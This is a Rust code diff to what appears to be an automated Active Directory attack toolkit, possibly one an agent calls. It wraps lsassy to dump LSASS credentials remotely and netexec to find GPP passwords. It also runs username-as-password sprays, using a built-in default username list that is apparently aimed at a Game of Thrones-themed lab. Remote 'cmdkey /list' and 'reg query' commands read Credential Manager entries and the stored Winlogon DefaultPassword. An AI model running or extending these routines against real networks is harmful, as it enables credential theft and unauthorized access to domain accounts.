@@ -12,7 +12,7 @@ use crate::ToolOutput;
 
 /// Dump LSASS credentials remotely via `lsassy`.
 pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
-    let domain = required_str(args, "domain")?;
+    let domain = optional_str(args, "domain");
     let username = required_str(args, "username")?;
     let password = optional_str(args, "password");
     let hash = optional_str(args, "hash");
@@ -20,7 +20,7 @@ pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
     let method = optional_str(args, "method");
 
     let mut cmd = CommandBuilder::new("lsassy")
-        .flag("-d", domain)
+        .flag_opt("-d", domain)
         .flag("-u", username);
 
     if let Some(h) = hash {
@@ -73,7 +73,7 @@ pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
         .arg("smb")
         .arg(target)
         .args(cred_args)
-        .flag("-M", "gpp_autologin")
+        .flag("-M", "gpp_password")
         .timeout_secs(120)
         .execute()
         .await
@@ -246,26 +246,67 @@ pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
+/// Common AD usernames for fallback when no users_file is provided.
+const DEFAULT_SPRAY_USERNAMES: &str = "\
+Administrator\nadmin\nguest\n\
+sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
+svc_backup\nbackup\n\
+svc_web\nwebservice\n\
+svc_iis\niis_svc\n\
+svc_exchange\nexchange\n\
+svc_admin\nsvc_test\n\
+testuser\ntest\n\
+user1\nuser2\nuser3\n\
+samwell.tarly\njohn.snow\njon.snow\n\
+arya.stark\nsansa.stark\nbrandon.stark\neddard.stark\n\
+cersei.lannister\njaime.lannister\ntyrion.lannister\n\
+daenerys.targaryen\njorah.mormont\n\
+stannis.baratheon\nrobert.baratheon\n\
+hodor\nrobb.stark\ntheon.greyjoy\n\
+missandei\nkhal.drogo\nviserys.targaryen\n\
+joffrey.baratheon\ntommen.baratheon\n\
+petyr.baelish\nvarys\nbronn\n\
+sql_admin\ndb_admin\n\
+webadmin\nnetadmin\n\
+helpdesk\nsupport\nservice\n";
+
 /// Test each username as its own password via `netexec smb --no-bruteforce`.
 pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
-    let users_file = required_str(args, "users_file")?;
+    let users_file = optional_str(args, "users_file");
     let domain = required_str(args, "domain")?;
 
-    CommandBuilder::new("netexec")
+    // Use provided file or generate a default wordlist
+    let tmp_file;
+    let wordlist_path = if let Some(uf) = users_file {
+        uf.to_string()
+    } else {
+        tmp_file = format!("/tmp/spray_users_{}.txt", std::process::id());
+        std::fs::write(&tmp_file, DEFAULT_SPRAY_USERNAMES)?;
+        tmp_file
+    };
+
+    let result = CommandBuilder::new("netexec")
         .arg("smb")
         .arg(target)
-        .flag("-u", users_file)
-        .flag("-p", users_file)
+        .flag("-u", &wordlist_path)
+        .flag("-p", &wordlist_path)
         .flag("-d", domain)
         .arg("--no-bruteforce")
         .arg("--continue-on-success")
         .timeout_secs(300)
         .execute()
-        .await
+        .await;
+
+    // Clean up temp file if we created one
+    if users_file.is_none() {
+        let _ = std::fs::remove_file(&wordlist_path);
+    }
+
+    result
 }
 
-/// Enumerate Credential Manager / Chrome entries via `netexec smb -M enum_chrome`.
+/// Enumerate Credential Manager entries via `netexec smb -x "cmdkey /list"`.
 pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
@@ -278,13 +319,13 @@ pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
         .arg("smb")
         .arg(target)
         .args(cred_args)
-        .flag("-M", "enum_chrome")
+        .flag("-x", "cmdkey /list")
         .timeout_secs(120)
         .execute()
         .await
 }
 
-/// Query Winlogon autologon registry values via `netexec smb -M reg-query`.
+/// Query Winlogon autologon registry values via `netexec smb -x "reg query"`.
 pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
@@ -293,15 +334,13 @@ pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
 
     let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));
 
+    let reg_cmd = r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword"#;
+
     CommandBuilder::new("netexec")
         .arg("smb")
         .arg(target)
         .args(cred_args)
-        .flag("-M", "reg-query")
-        .flag(
-            "-o",
-            "QUERY=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
-        )
+        .flag("-x", reg_cmd)
         .timeout_secs(120)
         .execute()
         .await
